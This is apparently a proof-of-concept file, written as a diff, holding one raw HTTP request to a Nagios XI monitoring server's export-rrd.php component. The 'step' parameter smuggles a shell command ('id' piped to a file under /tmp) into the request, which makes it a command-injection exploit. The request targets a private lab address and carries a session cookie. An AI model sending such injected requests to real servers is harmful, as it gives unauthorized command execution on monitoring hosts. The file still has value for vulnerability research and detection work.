@@ -1,0 +1,11 @@
+GET /nagiosxi/includes/components/xicore/export-rrd.php?host=localhost&service=Root%20Partition&start=1584108670&end=1584195130&step=X|id>/tmp/idnow2;%23&type=a&nsp=6146c423984d06f17cd07305ebef665bf229524b11143a97e29f543913f33d16 HTTP/1.1
+Host: 192.168.1.221
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://192.168.1.221/nagiosxi/includes/components/xicore/status.php?show=servicedetail&host=localhost&service=Root%20Partition
+Cookie: nagiosxi=ecv13m6j4iffboobuea8ut6t64
+Upgrade-Insecure-Requests: 1
+
